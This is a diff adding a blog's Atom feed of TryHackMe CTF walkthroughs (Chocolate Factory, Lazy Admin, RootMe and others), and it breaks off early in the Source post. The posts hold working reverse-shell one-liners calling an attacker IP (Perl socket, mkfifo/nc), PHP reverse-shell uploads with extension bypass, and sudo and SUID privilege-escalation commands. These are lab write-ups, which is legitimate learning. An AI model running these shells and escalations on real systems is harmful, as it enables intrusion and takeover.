@@ -1,0 +1,1589 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-06T13:44:11+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Cyber Heroes</title><link href="http://localhost:4000/tryhackme-cyber-heroes/" rel="alternate" type="text/html" title="TryHackMe - Cyber Heroes" /><published>2023-03-30T00:00:00+03:00</published><updated>2023-03-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-cyber-heroes</id><content type="html" xml:base="http://localhost:4000/tryhackme-cyber-heroes/"><![CDATA[<p>Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!</p>
+
+<p><br /></p>
+
+<h2 id="1-cyberheroes">1. CyberHeroes</h2>
+
+<p><br /></p>
+
+<h3 id="11-uncover-the-flag">1.1 Uncover the flag!</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.39.168
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/cyber-heroes/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. Theese are <code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code>.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>I found three pages on the website. These are <code class="language-plaintext highlighter-rouge">Home, About, and Login</code>.</p>
+
+<p>Let’s look at them all.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">Home</code></strong></em></p>
+
+    <p><img src="/assets/img/tryhackme/cyber-heroes/home.png" alt="home" /></p>
+
+    <p>I check the source page but I don’t see anything significant.</p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">About</code></strong></em></p>
+
+    <p>I don’t see anything significant on the page.</p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">Login</code></strong></em></p>
+
+    <p><img src="/assets/img/tryhackme/cyber-heroes/login.png" alt="login" /></p>
+
+    <p>I check the source page and I found this script.</p>
+
+    <p><img src="/assets/img/tryhackme/cyber-heroes/source.png" alt="source" /></p>
+
+    <p>As I understand it <code class="language-plaintext highlighter-rouge">username: h3ck3rBoi</code> and <code class="language-plaintext highlighter-rouge">password: RevereString("*****@t*****r****")</code>.</p>
+
+    <p>We need to write the password in reverse. So, <code class="language-plaintext highlighter-rouge">password: S****S*****@*****</code></p>
+  </li>
+</ul>
+
+<p>Now that we’ve found the username and password, let’s log in.</p>
+
+<p>And the flag is here.</p>
+
+<p><img src="/assets/img/tryhackme/cyber-heroes/flag.png" alt="flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, security, credential" /><summary type="html"><![CDATA[Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/cyber-heroes.png" /><media:content medium="image" url="http://localhost:4000/assets/img/cyber-heroes.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe Chocolate Factory</title><link href="http://localhost:4000/tryhackme-chocolate-factory/" rel="alternate" type="text/html" title="TryHackMe Chocolate Factory" /><published>2023-03-29T00:00:00+03:00</published><updated>2023-03-29T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-chocolate-factory</id><content type="html" xml:base="http://localhost:4000/tryhackme-chocolate-factory/"><![CDATA[<p>A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!</p>
+
+<p><br /></p>
+
+<h2 id="1-introduction">1. Introduction</h2>
+
+<p>Welcome to Willy Wonka’s Chocolate Factory!</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/golden-ticket.jpg" alt="golden-ticket" /></p>
+
+<p>This room was designed so that hackers can revisit the Willy Wonka’s Chocolate Factory and meet Oompa Loompa</p>
+
+<p>This is a beginner friendly room!</p>
+
+<p>If you have any issues / queries you can reach us through Discord or Twitter.</p>
+
+<p>( Created by AndyInfosec team for the community! )</p>
+
+<p><br /></p>
+
+<h2 id="2-challenges">2. Challenges</h2>
+
+<p><br /></p>
+
+<h3 id="21-enter-the-key-you-found">2.1 Enter the key you found!</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/nmap.png" alt="nmap" /></p>
+
+<p>A lot of ports are open.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/home.png" alt="home" /></p>
+
+<p>I see a login page. Let’s do a gobuster scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.153.7/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gobuster.png" alt="gobuster" /></p>
+
+<p>We found a few php files. First, let’s look at <code class="language-plaintext highlighter-rouge">home.php</code>.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/php.png" alt="php" /></p>
+
+<p>We can run commands on this page. Let’s connect with burp suite. Capture the page and send it to the repeater.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ls.png" alt="ls" /></p>
+
+<p>Let’s look at the files in the directory in order, of what we will find.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">index.php.bak</code></strong></em></p>
+
+    <p>I don’t see anything significant here.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/bak.png" alt="bak" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">key_rev_key</code></strong></em></p>
+
+    <p>This file is probably a script because the cat command doesn’t work.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key-rev-key.png" alt="key-rev-key" /></p>
+
+    <p>Let’s back to the website and download the key-rev-key file. <a href="http://10.10.153.7/key_rev_key">http://10.10.153.7/key_rev_key</a></p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/cat.png" alt="cat" /></p>
+
+    <p>Let’s try.</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ chmod +x key_rev_key
+ $ ./key_rev_key 
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/try.png" alt="try" /></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> $ strings key_rev_key
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/strings.png" alt="strings" /></p>
+
+    <p>Let’s try the name <code class="language-plaintext highlighter-rouge">laksdhfas</code>.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/key.png" alt="key" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">validate.php</code></strong></em></p>
+
+    <p>We found the username and password for the website.</p>
+
+    <p><img src="/assets/img/tryhackme/chocolate-factory/validate.png" alt="validate" /></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="22-what-is-charlies-password">2.2 What is Charlie’s password?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: c*****</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-change-user-to-charlie">2.3 Change user to charlie</h3>
+
+<p>Now, we can execute a reverse-shell command on home.php. First, let’s go to the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey’s cheat sheet</a>. You can try all of them.</p>
+
+<p>Perl, python, and netcat are working.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/shell.png" alt="shell" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use Socket;$i="10.8.86.168";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div></div>
+
+<p>First, let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>After copying and pasting.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/reverse.png" alt="reverse" /></p>
+
+<p>We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/inside-first.png" alt="inside-first" /></p>
+
+<p>Now, we can change the user to charlie.</p>
+
+<p>We found a RSA key in charlie’s directory</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/charlie/teleport
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/rsa.png" alt="rsa" /></p>
+
+<p>Let’s connect to charlie ssh.</p>
+
+<p>First, create an id_rsa file on your own machine and copy rsa key on the target machine, and paste it into the id_rsa file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ chmod +x id_rsa
+$ ssh -i id_rsa charlie@10.10.153.7
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/ssh.png" alt="ssh" /></p>
+
+<p>And we are inside.</p>
+
+<p><br /></p>
+
+<h3 id="24-enter-the-user-flag">2.4 Enter the user flag</h3>
+
+<p>Now, let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="25-enter-the-root-flag">2.5 Enter the root flag</h3>
+
+<p>Now, we checking the sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/sudo-l.png" alt="sudo-l" /></p>
+
+<p>We can get root privileges using vi. I’m going to <a href="https://gtfobins.github.io/gtfobins/vi/">gtfobins</a> and see what I can do with vi.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/gtfobins.png" alt="gtfobins" /></p>
+
+<p>Now, we can root privilege using this command.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vi -c ':!/bin/sh' /dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/privesc.png" alt="privesc" /></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/chocolate-factory/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="ctf, privesc, stego" /><summary type="html"><![CDATA[A Charlie And The Chocolate Factory themed room, revisit Willy Wonka’s chocolate factory!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/chocolate-factory.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Lazy Admin</title><link href="http://localhost:4000/tryhackme-lazy-admin/" rel="alternate" type="text/html" title="TryHackMe - Lazy Admin" /><published>2023-03-28T00:00:00+03:00</published><updated>2023-03-28T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-lazy-admin</id><content type="html" xml:base="http://localhost:4000/tryhackme-lazy-admin/"><![CDATA[<p>Easy linux machine to practice your skills</p>
+
+<p><br /></p>
+
+<h2 id="1-lazy-admin">1. Lazy Admin</h2>
+
+<p>Have some fun! There might be multiple ways to get user access.</p>
+
+<p><br /></p>
+
+<h3 id="11-what-is-the-user-flag">1.1 What is the user flag?</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.221.70
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>I see an apache default page on the website.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/apache.png" alt="apache" /></p>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">gobuster</code> scan for the website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-one.png" alt="gobuster-one" /></p>
+
+<p>We found the  <code class="language-plaintext highlighter-rouge">/content/</code> directory. Let’s go to the directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/content.png" alt="content" /></p>
+
+<p>This website uses <code class="language-plaintext highlighter-rouge">SweetRice</code> and it seems to be closed.</p>
+
+<p>So, I try another gobuster scan on this directory.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.221.70/content/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/gobuster-content.png" alt="gobuster-content" /></p>
+
+<p>We found a few directories here. Let’s examine all directories.</p>
+
+<ul>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/inc/</code></strong></em></p>
+
+    <p>We found a lot of files in this directory.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/inc.png" alt="inc" /></p>
+
+    <p>I found lastest.txt. It seems <code class="language-plaintext highlighter-rouge">SweetRice's</code> running version is <code class="language-plaintext highlighter-rouge">1.5.1.</code> Maybe this version is vulnerable.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/lastest.png" alt="lastest" /></p>
+  </li>
+  <li>
+    <p><em><strong><code class="language-plaintext highlighter-rouge">/as/</code></strong></em></p>
+
+    <p>We found a login page here.</p>
+
+    <p><img src="/assets/img/tryhackme/lazy-admin/as.png" alt="as" /></p>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<p>I searched SweetRice in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/search.png" alt="search" /></p>
+
+<p>I am looking to the first. <a href="https://www.exploit-db.com/exploits/40718">SweetRice 1.5.1 - Backup Disclosure</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/first.png" alt="first" /></p>
+
+<p>According to the vulnerability, there is a msql_backup file under the /inc/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/say.png" alt="say" /></p>
+
+<p>Let’s go and see.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/back.png" alt="back" /></p>
+
+<p>Let’s go to the /mysql_backup/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-file.png" alt="sql-file" /></p>
+
+<p>Let’s see what’s inside this file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat mysql_bakup_20191129023059-1.5.1.sql
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sql-inside.png" alt="sql-inside" /></p>
+
+<p>We found two important things here.</p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Admin: manager</code></strong></em></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: 42f749ade7f9e195bf475f37a44cafcb</code></strong></em></p>
+
+<p>It seems the password is a hash. Let’s identify and crack this hash.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/hash-id.png" alt="hash-id" /></p>
+
+<p>This password is encrypted using <strong><code class="language-plaintext highlighter-rouge">MD5</code></strong>.</p>
+
+<p>Let’s crack. <a href="https://md5decrypt.net/">https://md5decrypt.net/</a></p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/crack-hash.png" alt="crack-hash" /></p>
+
+<p><em><strong><code class="language-plaintext highlighter-rouge">Passwd: *******</code></strong></em></p>
+
+<p>Now we can log in as an admin user. Let’s go to the /as/ directory and log in.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/home.png" alt="home" /></p>
+
+<p>Now we can upload a reverse shell. So, I download pentest monkey’s <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">php-reverse-shell.php</a> and edit the php file. <code class="language-plaintext highlighter-rouge">($ip and $port)</code></p>
+
+<p>Then we go to the Post &gt; Create</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/post-create.png" alt="post-create" /></p>
+
+<p>After, we can add a file below the page. (.php file isn’t working you must change the extension.)</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/below.png" alt="below" /></p>
+
+<p>After the upload, the page looks like this.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/upload.png" alt="upload" /></p>
+
+<p>Now, we set up a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444 
+</code></pre></div></div>
+
+<p>Then we go to the <a href="http://10.10.103.31/content/attachment/shell.phtml">http://10.10.103.31/content/attachment/shell.phtml</a></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/inside.png" alt="inside" /></p>
+
+<p>Now, let’s get to the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-what-is-the-root-flag">1.2 What is the root flag?</h3>
+
+<p>Very surprisingly for www-data, we have sudo privileges.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo -l
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/sudo-l.png" alt="sudo-l" /></p>
+
+<p>The backup script is a Perl script that calls /etc/copy.sh</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/copy.png" alt="copy" /></p>
+
+<p>Now we edit this copy.sh, file to get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; /etc/copy.sh 
+</code></pre></div></div>
+
+<p>Let’s setup a netcat listener.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 5555 
+</code></pre></div></div>
+
+<p>Let’s run the backup.pl file and get the root privilege.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo perl /home/itguy/backup.pl
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/privesc.png" alt="privesc" /></p>
+
+<p>We are inside. Let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/lazy-admin/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="security, linux" /><summary type="html"><![CDATA[Easy linux machine to practice your skills]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/lazy-admin.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/img/lazy-admin.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - RootMe</title><link href="http://localhost:4000/tryhackme-rootme/" rel="alternate" type="text/html" title="TryHackMe - RootMe" /><published>2023-03-27T00:00:00+03:00</published><updated>2023-03-27T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-rootme</id><content type="html" xml:base="http://localhost:4000/tryhackme-rootme/"><![CDATA[<p>A ctf for beginners, can you root me?</p>
+
+<p><br /></p>
+
+<h2 id="1-deploy-the-machine">1. Deploy the machine</h2>
+
+<p>Connect to TryHackMe network and deploy the machine. If you don’t know how to do this, complete the OpenVPN room first.</p>
+
+<p><br /></p>
+
+<h2 id="2-reconnaissance">2 Reconnaissance</h2>
+
+<p>First, let’s get information about the target.</p>
+
+<p><br /></p>
+
+<h3 id="21-scan-the-machine-how-many-ports-are-open">2.1 Scan the machine, how many ports are open?</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.226.173
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/rootme/nmap.png" alt="nmap" /></p>
+
+<p>Two ports are open. These are <strong><code class="language-plaintext highlighter-rouge">22/tcp SSH and 80/tcp HTTP</code></strong>.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="22-what-version-of-apache-is-running">2.2 What version of Apache is running?</h3>
+
+<p><img src="/assets/img/tryhackme/rootme/apache.png" alt="apache" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: 2.4.29</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="23-what-service-is-running-on-port-22">2.3 What service is running on port 22?</h3>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: SSH</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="24-find-directories-on-the-web-server-using-the-gobuster-tool">2.4 Find directories on the web server using the GoBuster tool.</h3>
+
+<p>I am visiting the website running on port 80. I see a page like this:</p>
+
+<p><img src="/assets/img/tryhackme/rootme/home.png" alt="home" /></p>
+
+<p>Let’s do a gobuster scan for this website.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u http://10.10.226.173/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h3 id="25-what-is-the-hidden-directory">2.5 What is the hidden directory?</h3>
+
+<p><img src="/assets/img/tryhackme/rootme/gobuster.png" alt="gobuster" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /panel/</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="3-getting-a-shell">3 Getting a shell</h2>
+
+<p>Find a form to upload and get a reverse shell, and find the flag.</p>
+
+<p><br /></p>
+
+<h3 id="31-usertxt">3.1 user.txt</h3>
+
+<p>I check the /uploads/ directory but nothing in here.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/uploads.png" alt="uploads" /></p>
+
+<p>I am going to the /panel/ directory.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/panel.png" alt="panel" /></p>
+
+<p>We upload files here. Then let’s do this:</p>
+<ul>
+  <li>Let’s download pentestmonkey’s php-reverse-shell.php file. <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Here</a>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Now, edit the php-reverse-shell.php file.</p>
+
+    <p><img src="/assets/img/tryhackme/rootme/edit.png" alt="edit" /></p>
+  </li>
+  <li>
+    <p>Let’s set up a netcat listener.</p>
+
+    <p><img src="/assets/img/tryhackme/rootme/nc.png" alt="nc" /></p>
+  </li>
+</ul>
+
+<p>Now we can upload the file to the website. Let’s go back to the /panel/ directory.</p>
+
+<p>I try to upload the file but it’s not working. I get error like this.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/error.png" alt="error" /></p>
+
+<p>Let’s try changing the extension of the PHP file. Like this:</p>
+
+<p><img src="/assets/img/tryhackme/rootme/ex.png" alt="ex" /></p>
+
+<p>If you want, you can try using burp suite, but there is not much possibility anyway, I prefer to change manually.</p>
+
+<p>I will try these: <code class="language-plaintext highlighter-rouge">.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml</code></p>
+
+<p>The <code class="language-plaintext highlighter-rouge">.phtml</code> worked.</p>
+
+<p>Now, let’s go to the /uploads/ directory and run the reverse shell we uploaded.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/upshell.png" alt="upshell" /></p>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/in.png" alt="in" /></p>
+
+<p>Now we can get the user flag.
+I looked at the user directories in the home directory, but could not find the user.txt.</p>
+
+<p>Now let’s find user.txt with this command.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/find.png" alt="find" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -name user.txt
+</code></pre></div></div>
+
+<p>Yes, we found the user.txt file.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/finduser.png" alt="finduser" /></p>
+
+<p>Let’s get the user flag.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/user-flag.png" alt="user-flag" /></p>
+
+<p><em><strong>Attention: It allows some files to be uploaded, but when you try to run it in the /uploads/ directory, you get something like this.</strong></em></p>
+
+<p><img src="/assets/img/tryhackme/rootme/uperror.png" alt="uperror" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="4-privilege-escalation">4 Privilege escalation</h2>
+
+<p>Now that we have a shell, let’s escalate our privileges to root.</p>
+
+<p><br /></p>
+
+<h3 id="41-search-for-files-with-suid-permission-which-file-is-weird">4.1 Search for files with SUID permission, which file is weird?</h3>
+
+<p><em><strong>Hint: find / -user root -perm /4000</strong></em></p>
+
+<p>Based on the hint, I ran the following code on the target system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ find / -type f -perm -04000 -ls 2&gt;/dev/null
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/rootme/suid.png" alt="suid" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Answer: /usr/bin/python</code></strong></p>
+
+<p><br /></p>
+
+<h3 id="42-find-a-form-to-escalate-your-privileges">4.2 Find a form to escalate your privileges.</h3>
+
+<p><em><strong>Hint : Search for gtfobins</strong></em></p>
+
+<p>Let’s go to <a href="https://gtfobins.github.io/gtfobins/python/">gtfobins</a> and search for python.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/gtfobins.png" alt="gtfobins" /></p>
+
+<p>Let’s run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/rootme/privesc.png" alt="privesc" /></p>
+
+<p>Yesss, We get root privilege. Now let’s get the root flag.</p>
+
+<p><img src="/assets/img/tryhackme/rootme/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, linux, security" /><summary type="html"><![CDATA[A ctf for beginners, can you root me?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/rootme.png" /><media:content medium="image" url="http://localhost:4000/assets/img/rootme.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Source</title><link href="http://localhost:4000/tryhackme-source/" rel="alternate" type="text/html" title="TryHackMe - Source" /><published>2023-03-25T00:00:00+03:00</published><updated>2023-03-25T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-source</id><content type="html" xml:base="http://localhost:4000/tryhackme-source/"><![CDATA[<p>Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-embark">1. Embark</h2>
+
+<p>Enumerate and root the box attached to this task. Can you discover the source of the disruption and leverage it to take control?</p>
+
+<p><br /></p>
+
+<h3 id="11-usertxt">1.1 user.txt</h3>
+
+<p>Let’s do a nmap scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.11.143
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/source/nmap.png" alt="nmap" /></p>
+
